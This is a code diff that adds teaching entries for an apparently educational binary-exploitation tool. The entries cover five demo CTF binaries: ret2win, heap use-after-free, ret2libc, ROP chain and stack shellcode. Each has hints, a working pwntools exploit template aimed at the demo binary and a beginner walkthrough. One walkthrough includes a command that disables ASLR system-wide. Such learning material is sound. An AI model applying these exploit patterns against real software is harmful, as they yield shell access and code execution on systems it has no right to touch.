@@ -5239,6 +5239,292 @@ DEMO_ANALYSES = {
                 "content": "NX is enabled so we cannot run our own code — but we do not need to, we are jumping to existing code (win). PIE is disabled so win() is always at the same address. There is no stack canary so our overflow is not detected. Everything aligned perfectly for this attack."
             }
         ]
+    },
+    "ret2win_demo": {
+        "filename": "ret2win_demo",
+        "source": "BinExplain Demo Binary",
+        "source_url": "https://binexplain.com/learn",
+        "competition": "BinExplain Educational Demo",
+        "year": "2026",
+        "license": "Original source, freely distributable for educational use",
+        "architecture": "x86-64",
+        "bits": 64,
+        "ctf_category": {
+            "category": "ret2win",
+            "confidence": "High",
+            "explanation": "A win() function exists in the symbol table that prints the flag. The vuln() function uses gets() with no bounds check. Overflow the buffer and redirect execution to win()."
+        },
+        "difficulty": "Easy",
+        "difficulty_reason": "No protections active. Win function at fixed address. Classic beginner challenge.",
+        "protections": {
+            "nx": "Enabled",
+            "pie": "Disabled",
+            "canary": "No canary",
+            "relro": "Partial RELRO",
+            "fortify": "No"
+        },
+        "overflow_offset": 72,
+        "dangerous_functions": ["gets"],
+        "win_address": "0x4011b6",
+        "ai_hints": "This is the simplest possible CTF challenge. The win() function at 0x4011b6 prints the flag but is never called. The vuln() function reads your input with gets() into a 64-byte buffer. Your offset is 72 bytes (64 buffer + 8 saved RBP). Payload: b'A' * 72 + p64(0x4011b6). Your pwntools template already has this filled in.",
+        "pwntools_template": "from pwn import *\n\nbinary = './ret2win_demo'\nelf = ELF(binary)\np = process(binary)\n\noffset = 72\nwin_addr = elf.sym['win']  # reads from symbol table automatically\n\nprint(f'[+] win() is at: {hex(win_addr)}')\n\npayload = b'A' * offset + p64(win_addr)\n\np.sendlineafter(b':', payload)\nprint(p.recvall().decode())",
+        "plain_english_walkthrough": [
+            {
+                "step": 1,
+                "title": "What is this binary?",
+                "content": "This is a 64-bit Linux program. When you run it, it says hello and asks for your name. Inside the program there is a secret function called win() that prints the flag. The program never calls win() on its own — you have to make it call win() by exploiting the vulnerability."
+            },
+            {
+                "step": 2,
+                "title": "What is the vulnerability?",
+                "content": "The program uses a function called gets() to read your name. gets() is dangerous because it reads as many characters as you type with no limit. The name box (called a buffer) is only 64 characters long. If you type more than 64 characters, the extra ones spill over into memory next to the buffer — this is called a buffer overflow."
+            },
+            {
+                "step": 3,
+                "title": "What is a return address?",
+                "content": "Every time a program runs a function, it saves a note saying 'when this function is done, go back here.' This note is called the return address and it lives right above the local buffer in memory. When we overflow the buffer, the extra bytes reach this note and we can change it to say 'go to win() instead.'"
+            },
+            {
+                "step": 4,
+                "title": "What is the offset?",
+                "content": "We need exactly 72 bytes before we reach the return address. The first 64 bytes fill the buffer. The next 8 bytes overwrite a saved value called the frame pointer. Then the very next 8 bytes are the return address. 64 + 8 = 72. This number is called the overflow offset."
+            },
+            {
+                "step": 5,
+                "title": "What is the exploit?",
+                "content": "Send 72 bytes of anything (we use the letter A) followed by the 8-byte address of win(). The program reads all of it, the A's fill the buffer and frame pointer, and the win() address overwrites the return address. When vuln() finishes, the CPU reads the return address and jumps to win() instead of back to main(). The flag is printed."
+            },
+            {
+                "step": 6,
+                "title": "Run the pwntools script",
+                "content": "Copy the starter script above. Run it with: python3 exploit.py. It automatically finds the win() address from the binary's symbol table, builds the payload, sends it, and prints the flag. You do not need to find the address manually — pwntools reads it directly from the binary file."
+            }
+        ]
+    },
+    "heap_demo": {
+        "filename": "heap_demo",
+        "source": "BinExplain Demo Binary",
+        "source_url": "https://binexplain.com/learn",
+        "competition": "BinExplain Educational Demo (adapted from shellphish/how2heap concepts)",
+        "year": "2026",
+        "license": "Original source, freely distributable for educational use",
+        "architecture": "x86-64",
+        "bits": 64,
+        "ctf_category": {
+            "category": "heap_exploitation",
+            "confidence": "High",
+            "explanation": "A use-after-free vulnerability exists: Item *a is freed but still referenced. malloc() returns the same memory for the next allocation. The function pointer in the struct can be overwritten."
+        },
+        "difficulty": "Hard",
+        "difficulty_reason": "Requires understanding of heap metadata, tcache behavior, and function pointer hijacking.",
+        "protections": {
+            "nx": "Enabled",
+            "pie": "Enabled",
+            "canary": "No canary",
+            "relro": "Full RELRO",
+            "fortify": "No"
+        },
+        "overflow_offset": None,
+        "dangerous_functions": ["malloc", "free"],
+        "ai_hints": "This is a use-after-free challenge. Chunk A (an Item struct) is freed but pointer a is still used afterward. When malloc() allocates the next chunk, glibc returns the same memory that A occupied (tcache optimization). The new chunk's data overlaps with A's function pointer field. Writing the address of win() to the right offset in the new allocation will cause the next a->print_func() call to execute win() instead.",
+        "pwntools_template": "from pwn import *\n\nbinary = './heap_demo'\nelf = ELF(binary)\np = process(binary)\n\nwin_addr = elf.sym['win']\nprint(f'[+] win() at: {hex(win_addr)}')\n\n# After free(a), malloc(sizeof(Item)) returns a's old memory\n# The function pointer is at offset 32 (after the 32-byte name field)\n# Write padding + win_addr to overwrite the function pointer\npayload = b'A' * 32 + p64(win_addr)\n\n# Interact with the program to trigger the UAF\n# (exact interaction depends on program flow)\np.sendline(payload)\np.interactive()",
+        "plain_english_walkthrough": [
+            {
+                "step": 1,
+                "title": "What is heap memory?",
+                "content": "The heap is a region of memory your program uses for things it needs to remember for a long time. Unlike the stack (which is automatic), you manually ask for heap memory with malloc() and return it with free(). Think of it like renting a storage unit — malloc() rents you a unit, free() returns the key."
+            },
+            {
+                "step": 2,
+                "title": "What is use-after-free?",
+                "content": "Use-after-free happens when a program returns memory (calls free()) but keeps using a pointer to that memory afterward. It is like returning the key to a storage unit but then walking in anyway. Someone else might have rented that unit in the meantime and put their stuff there."
+            },
+            {
+                "step": 3,
+                "title": "What is the vulnerability here?",
+                "content": "The program creates an Item struct with a function pointer (print_func) that points to safe_print(). Then it calls free(a) — but keeps the pointer a! When malloc() is called again for a same-sized chunk, glibc returns the same memory address. Now if we control what is written to that memory, we control what a->print_func points to."
+            },
+            {
+                "step": 4,
+                "title": "What is a function pointer?",
+                "content": "A function pointer is a variable that stores the address of a function instead of regular data. When the program calls a->print_func(), it does not call safe_print() by name — it reads the address from the struct and jumps there. If we change that address to point to win(), the program jumps to win() instead."
+            },
+            {
+                "step": 5,
+                "title": "How do you exploit it?",
+                "content": "After free(a), write data to the next allocation (which goes to the same memory). The function pointer is stored at byte offset 32 (after the 32-byte name field). Write 32 bytes of padding followed by the 8-byte address of win(). When print_func is called through the old pointer, it executes win()."
+            }
+        ]
+    },
+    "ret2libc_demo": {
+        "filename": "ret2libc_demo",
+        "source": "BinExplain Demo Binary",
+        "source_url": "https://binexplain.com/learn",
+        "competition": "BinExplain Educational Demo",
+        "year": "2026",
+        "license": "Original source, freely distributable for educational use",
+        "architecture": "x86-64",
+        "bits": 64,
+        "ctf_category": {
+            "category": "ret2libc",
+            "confidence": "High",
+            "explanation": "No win() function. NX enabled prevents shellcode. The binary calls puts() which is in the PLT — leak puts' GOT entry to find libc base, then compute system() and /bin/sh."
+        },
+        "difficulty": "Medium",
+        "difficulty_reason": "Two-stage exploit required: leak libc address then compute system() offset.",
+        "protections": {
+            "nx": "Enabled",
+            "pie": "Disabled",
+            "canary": "No canary",
+            "relro": "Partial RELRO",
+            "fortify": "No"
+        },
+        "overflow_offset": 72,
+        "dangerous_functions": ["gets", "puts"],
+        "ai_hints": "No win function, NX is on so no shellcode. PIE is disabled so binary addresses are fixed. Use puts() in the PLT to leak the GOT entry of puts, which reveals the real libc address. Calculate libc base: leaked_puts - libc.sym['puts']. Then system() = libc_base + libc.sym['system']. Find /bin/sh in libc: next(libc.search(b'/bin/sh')). Build second payload: padding + pop_rdi_gadget + binsh_addr + system_addr.",
+        "pwntools_template": "from pwn import *\n\nbinary = './ret2libc_demo'\nlibc_path = '/lib/x86_64-linux-gnu/libc.so.6'  # adjust for your system\n\nelf = ELF(binary)\nlibc = ELF(libc_path)\np = process(binary)\n\noffset = 72\n\n# Stage 1: Leak puts() address from GOT\npop_rdi = 0x401293  # find with: ROPgadget --binary ./ret2libc_demo | grep \"pop rdi\"\nret_gadget = 0x40101a  # stack alignment\n\nstage1 = b'A' * offset\nstage1 += p64(pop_rdi)\nstage1 += p64(elf.got['puts'])\nstage1 += p64(elf.plt['puts'])\nstage1 += p64(elf.sym['main'])  # return to main for stage 2\n\np.sendlineafter(b':', stage1)\nleaked = u64(p.recvline().strip().ljust(8, b'\\x00'))\nprint(f'[+] Leaked puts: {hex(leaked)}')\n\nlibc_base = leaked - libc.sym['puts']\nprint(f'[+] libc base: {hex(libc_base)}')\n\nsystem = libc_base + libc.sym['system']\nbinsh = libc_base + next(libc.search(b'/bin/sh'))\n\n# Stage 2: Call system('/bin/sh')\nstage2 = b'A' * offset\nstage2 += p64(ret_gadget)   # stack alignment\nstage2 += p64(pop_rdi)\nstage2 += p64(binsh)\nstage2 += p64(system)\n\np.sendlineafter(b':', stage2)\np.interactive()",
+        "plain_english_walkthrough": [
+            {
+                "step": 1,
+                "title": "Why can we not use shellcode?",
+                "content": "NX (No-Execute) is enabled. This means the CPU refuses to run code stored on the stack. Even if we overflow the buffer and put our own code there, the CPU will crash instead of executing it. We need a different approach."
+            },
+            {
+                "step": 2,
+                "title": "What is libc?",
+                "content": "libc is the C Standard Library — a collection of useful functions that almost every program uses. It includes puts() for printing, gets() for reading, system() for running shell commands, and thousands of others. Every Linux program links to libc. system('/bin/sh') opens a shell."
+            },
+            {
+                "step": 3,
+                "title": "Why is libc's address random?",
+                "content": "ASLR (Address Space Layout Randomization) makes the OS load libc at a different random address every time the program runs. We cannot hardcode the address of system() because it changes every run. We need to leak the actual address first."
+            },
+            {
+                "step": 4,
+                "title": "How do we leak the address?",
+                "content": "The binary calls puts(), which means puts()'s real address is stored in the GOT (Global Offset Table). We can make the program call puts(GOT[puts]) — that is, print the address of puts itself. That address is in libc, so subtracting the known offset of puts from libc gives us the libc base address."
+            },
+            {
+                "step": 5,
+                "title": "How do we call system('/bin/sh')?",
+                "content": "Once we know libc base, we add the fixed offset of system() to get its real address. We also find '/bin/sh' string inside libc. We build a ROP chain: pop rdi (puts /bin/sh address into the first argument register) then call system(). The pop rdi gadget is a two-instruction snippet in the binary."
+            },
+            {
+                "step": 6,
+                "title": "Why is this a two-stage exploit?",
+                "content": "Stage 1 leaks the libc address by calling puts(GOT[puts]) then returning to main(). Stage 2 uses the leaked address to call system('/bin/sh'). We return to main() between stages so we get a second input prompt. This is the standard ret2libc pattern."
+            }
+        ]
+    },
+    "rop_chain_demo": {
+        "filename": "rop_chain_demo",
+        "source": "BinExplain Demo Binary",
+        "source_url": "https://binexplain.com/learn",
+        "competition": "BinExplain Educational Demo",
+        "year": "2026",
+        "license": "Original source, freely distributable for educational use",
+        "architecture": "x86-64",
+        "bits": 64,
+        "ctf_category": {
+            "category": "rop_chain",
+            "confidence": "High",
+            "explanation": "NX enabled, no shellcode possible. Binary includes system() in PLT (via unused function). Classic ROP chain: pop rdi gadget + /bin/sh + system()."
+        },
+        "difficulty": "Medium",
+        "difficulty_reason": "system() is available in PLT (easier than ret2libc). Only need one gadget and the /bin/sh string.",
+        "protections": {
+            "nx": "Enabled",
+            "pie": "Disabled",
+            "canary": "No canary",
+            "relro": "Partial RELRO",
+            "fortify": "No"
+        },
+        "overflow_offset": 72,
+        "dangerous_functions": ["read", "system"],
+        "ai_hints": "system() is available in the PLT from the unused() function. No need to leak libc — system() address is fixed because PIE is disabled. Find 'pop rdi ; ret' gadget with ROPgadget. Find '/bin/sh' in binary strings or libc. Chain: padding + pop_rdi + binsh_addr + system_plt.",
+        "pwntools_template": "from pwn import *\n\nbinary = './rop_chain_demo'\nelf = ELF(binary)\np = process(binary)\n\noffset = 72\n\n# Find gadgets: ROPgadget --binary ./rop_chain_demo | grep \"pop rdi\"\npop_rdi = 0x401293   # replace with actual address from ROPgadget\nret     = 0x40101a   # stack alignment gadget\n\n# system() is in PLT because unused() calls it\nsystem_plt = elf.plt['system']\nprint(f'[+] system@plt: {hex(system_plt)}')\n\n# Find /bin/sh in binary or libc\nbinsh = next(elf.search(b'/bin/sh'))\nif not binsh:\n    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n    binsh = libc.address + next(libc.search(b'/bin/sh'))\nprint(f'[+] /bin/sh at: {hex(binsh)}')\n\npayload = b'A' * offset\npayload += p64(ret)        # stack alignment\npayload += p64(pop_rdi)    # pop rdi gadget\npayload += p64(binsh)      # /bin/sh into rdi\npayload += p64(system_plt) # call system(rdi)\n\np.sendlineafter(b':', payload)\np.interactive()",
+        "plain_english_walkthrough": [
+            {
+                "step": 1,
+                "title": "What is Return Oriented Programming?",
+                "content": "ROP is a technique for exploiting programs when NX is enabled and you cannot run your own code. Instead of writing new code, you reuse tiny pieces of the program's existing code called gadgets. Each gadget is a short sequence of instructions that ends with ret (return). By controlling the stack, you chain gadgets together like LEGO bricks."
+            },
+            {
+                "step": 2,
+                "title": "What is a gadget?",
+                "content": "A gadget is a snippet of machine code ending with the ret instruction. The simplest useful gadget is 'pop rdi ; ret' — it reads one value off the stack into the RDI register, then returns to the next address on the stack. RDI is the first argument register in 64-bit Linux — whatever you put in RDI becomes the first argument to the next function you call."
+            },
+            {
+                "step": 3,
+                "title": "Why does this binary have system()?",
+                "content": "There is an unused() function in the binary that calls system('ls'). The compiler includes system() in the PLT even though unused() is never called by main(). This gives us system() at a fixed, known address — we do not need to leak libc."
+            },
+            {
+                "step": 4,
+                "title": "What is the exploit chain?",
+                "content": "We overflow the buffer (72 bytes of padding). Then we place 3 addresses on the stack: pop_rdi gadget (puts /bin/sh address into RDI), then the address of the /bin/sh string, then system(). When vuln() returns, it executes our chain: pop rdi runs, then ret jumps to system() with '/bin/sh' already in RDI. Result: system('/bin/sh') = shell."
+            },
+            {
+                "step": 5,
+                "title": "What is stack alignment?",
+                "content": "64-bit Linux requires the stack to be 16-byte aligned when calling functions like system(). Sometimes we need to add a 'ret' gadget before the pop rdi to add 8 bytes and fix the alignment. If your exploit crashes inside system() rather than executing the shell, add the ret gadget and try again."
+            }
+        ]
+    },
+    "shellcode_demo": {
+        "filename": "shellcode_demo",
+        "source": "BinExplain Demo Binary",
+        "source_url": "https://binexplain.com/learn",
+        "competition": "BinExplain Educational Demo",
+        "year": "2026",
+        "license": "Original source, freely distributable for educational use",
+        "architecture": "x86-64",
+        "bits": 64,
+        "ctf_category": {
+            "category": "shellcode",
+            "confidence": "High",
+            "explanation": "NX is DISABLED (compiled with -z execstack). Stack is executable. Buffer is 128 bytes with a 256-byte read — overflow is trivial. Inject shellcode at start of buffer, point return address there."
+        },
+        "difficulty": "Easy",
+        "difficulty_reason": "NX disabled means shellcode runs directly. PIE disabled means stack addresses are predictable. Most beginner-friendly shellcode challenge.",
+        "protections": {
+            "nx": "Disabled",
+            "pie": "Disabled",
+            "canary": "No canary",
+            "relro": "Partial RELRO",
+            "fortify": "No"
+        },
+        "overflow_offset": 136,
+        "dangerous_functions": ["read"],
+        "ai_hints": "NX is disabled so the stack is executable. Write shellcode at the start of the buffer, then overflow the return address to point back into the buffer. Use pwntools shellcraft.sh() to generate the shellcode — it produces the exact bytes to call execve('/bin/sh'). Find the buffer address with gdb (info frame after breaking in vuln). PIE is disabled so the address is stable across runs.",
+        "pwntools_template": "from pwn import *\n\nbinary = './shellcode_demo'\nelf = ELF(binary)\ncontext.binary = elf\ncontext.arch = 'amd64'\np = process(binary)\n\n# Generate execve('/bin/sh') shellcode\nshellcode = asm(shellcraft.sh())\nprint(f'[+] Shellcode: {len(shellcode)} bytes')\nprint(f'[+] Shellcode hex: {shellcode.hex()}')\n\noffset = 136  # 128 buffer + 8 saved RBP\n\n# Find the buffer address using gdb:\n# gdb ./shellcode_demo\n# break vuln\n# run\n# info frame (look for rsp or local buffer address)\nbuf_addr = 0x7fffffffde80  # REPLACE with actual buffer address from gdb\n\npayload = shellcode\npayload += b'A' * (offset - len(shellcode))  # fill to return address\npayload += p64(buf_addr)  # jump back to start of buffer = start of shellcode\n\np.sendlineafter(b':', payload)\np.interactive()",
+        "plain_english_walkthrough": [
+            {
+                "step": 1,
+                "title": "What is shellcode?",
+                "content": "Shellcode is a small program written in raw machine code bytes (not C or Python — actual CPU instructions as numbers). The name comes from its most common goal: opening a shell. A typical shellcode calls execve('/bin/sh') which replaces the current process with a bash shell, giving the attacker full control."
+            },
+            {
+                "step": 2,
+                "title": "Why does NX disabled matter?",
+                "content": "Normally the CPU refuses to execute code stored in the stack (NX protection). With NX disabled, the stack is both writable AND executable. This means any bytes you write to the stack can be run as code. This is the oldest and simplest exploitation technique — it was defeated by NX in the mid-2000s, which is why modern systems always have it enabled."
+            },
+            {
+                "step": 3,
+                "title": "What is the plan?",
+                "content": "Write shellcode at the start of the buffer. Then overflow the return address to point to the start of the buffer. When the function returns, the CPU reads our return address and jumps to the start of the buffer — right where our shellcode is waiting. The shellcode calls execve('/bin/sh') and we have a shell."
+            },
+            {
+                "step": 4,
+                "title": "How do you find the buffer address?",
+                "content": "PIE is disabled so the stack is at a predictable address. Run the binary in gdb, set a breakpoint in vuln(), and use 'info frame' or 'print &buf' to find the exact address. Since ASLR might still randomize it, either disable ASLR (echo 0 > /proc/sys/kernel/randomize_va_space) or use a NOP sled — pad with 0x90 bytes before shellcode so any nearby address that hits the NOP sled will slide to the shellcode."
+            },
+            {
+                "step": 5,
+                "title": "What is a NOP sled?",
+                "content": "0x90 is the NOP instruction (No Operation) — the CPU does nothing and moves to the next byte. A NOP sled is a long sequence of 0x90 bytes placed before your shellcode. If your return address lands anywhere in the NOP sled, the CPU slides forward through all the NOPs until it hits your shellcode. This makes the exploit more reliable when you are not sure of the exact buffer address."
+            }
+        ]
     }
 }
 
